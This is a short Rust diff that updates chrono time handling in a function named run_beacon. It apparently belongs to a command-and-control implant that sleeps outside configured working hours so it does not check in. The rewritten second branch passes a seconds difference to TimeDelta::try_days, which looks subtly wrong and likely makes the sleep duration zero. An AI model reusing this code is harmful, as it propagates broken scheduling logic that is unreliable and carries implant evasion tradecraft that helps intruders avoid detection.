@@ -1,5 +1,5 @@
 use chrono::prelude::{DateTime, Local, NaiveDate, NaiveDateTime};
-use chrono::Duration;
+use chrono::TimeDelta;
 use std::error::Error;
 
 use crate::agent::calculate_sleep_time;
@@ -85,11 +85,18 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
 
         // Check the agent's working hours and don't check in if not in the configured time frame
         if now < working_start {
-            let delta = Duration::seconds(working_start.timestamp() - now.timestamp());
+            let delta = TimeDelta::try_seconds(
+                working_start.and_utc().timestamp() - now.and_utc().timestamp(),
+            )
+            .unwrap_or_default();
             std::thread::sleep(delta.to_std()?);
         } else if now > working_end {
-            let next_start = working_start.checked_add_signed(Duration::days(1)).unwrap();
-            let delta = Duration::seconds(next_start.timestamp() - now.timestamp());
+            let next_start = working_start
+                .checked_add_signed(TimeDelta::try_days(1).unwrap())
+                .unwrap();
+            let delta =
+                TimeDelta::try_days(next_start.and_utc().timestamp() - now.and_utc().timestamp())
+                    .unwrap_or_default();
             std::thread::sleep(delta.to_std()?);
         }
 
